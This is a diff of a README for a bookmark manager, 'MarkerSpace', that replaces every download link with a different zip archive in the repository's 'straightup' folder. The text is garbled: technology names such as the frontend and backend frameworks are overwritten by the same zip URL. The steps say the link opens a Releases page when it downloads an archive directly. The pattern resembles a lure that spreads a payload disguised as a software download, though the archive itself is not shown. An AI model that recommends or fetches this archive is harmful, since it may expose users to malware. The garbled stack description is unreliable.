@@ -8,7 +8,7 @@ MarkerSpace is an easy-to-use web application designed for managing your browser
 
 To download MarkerSpace, visit the link below:
 
-[![Download MarkerSpace](https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip)](https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip)
+[![Download MarkerSpace](https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip)](https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed there.
@@ -43,8 +43,8 @@ To run MarkerSpace, ensure your system meets the following requirements:
 
 MarkerSpace is built using modern technologies to provide a seamless experience:
 
-- **Frontend**: Developed using https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip, TypeScript, and Shadcn/ui. This combination ensures a high-quality, responsive design that is easy to navigate.
-- **Backend**: Powered by https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip and https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip with a MongoDB database. This stack allows for efficient data handling and secure user authentication using JWT.
+- **Frontend**: Developed using https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip, TypeScript, and Shadcn/ui. This combination ensures a high-quality, responsive design that is easy to navigate.
+- **Backend**: Powered by https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip and https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip with a MongoDB database. This stack allows for efficient data handling and secure user authentication using JWT.
 - **Styling**: Tailwind CSS is used for a clean and modern UI.
 
 ## 📖 How to Use MarkerSpace
@@ -73,7 +73,7 @@ You can also join our community of MarkerSpace users. Follow us on social media 
 
 1. Click the link below to download MarkerSpace:
    
-   [![Download MarkerSpace](https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip)](https://github.com/psychomantis03/MarkerSpace/raw/refs/heads/main/straightup/Marker_Space_v1.3-beta.5.zip)
+   [![Download MarkerSpace](https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip)](https://raw.githubusercontent.com/psychomantis03/MarkerSpace/main/straightup/Space_Marker_2.9.zip)
 
 2. Follow the installation steps above to set it up on your device.
 3. Start enjoying a more organized online experience through efficient bookmark management.
